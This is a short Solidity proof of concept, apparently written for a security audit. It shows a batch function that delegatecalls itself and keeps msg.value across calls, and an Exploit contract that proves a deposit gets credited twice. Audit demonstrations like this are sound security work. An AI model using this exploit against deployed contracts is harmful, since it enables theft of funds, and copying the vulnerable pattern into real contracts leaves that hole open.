// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract Ladle {
    uint256 public credited;
    function batch(bytes[] calldata calls) external payable returns (bytes[] memory results) {
        results = new bytes[](calls.length);
        for (uint256 i; i < calls.length; ++i) {
            // @> Every delegatecall retains the original msg.value.
            (bool success, bytes memory result) = address(this).delegatecall(calls[i]);
            require(success, "batch call failed");
            results[i] = result;
        }
    }
    function credit() external payable { credited += msg.value; }
    function withdraw(address payable to) external { to.transfer(address(this).balance); }
}

contract Exploit {
    event Proof(uint256 supplied, uint256 credited);
    receive() external payable {}
    function run() external payable {
        Ladle ladle = new Ladle();
        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSignature("credit()");
        calls[1] = abi.encodeWithSignature("credit()");
        ladle.batch{value: msg.value}(calls);
        uint256 credited = ladle.credited();
        ladle.withdraw(payable(address(this)));
        emit Proof(msg.value, credited);
        require(credited == msg.value * 2, "msg.value not retained");
    }
}
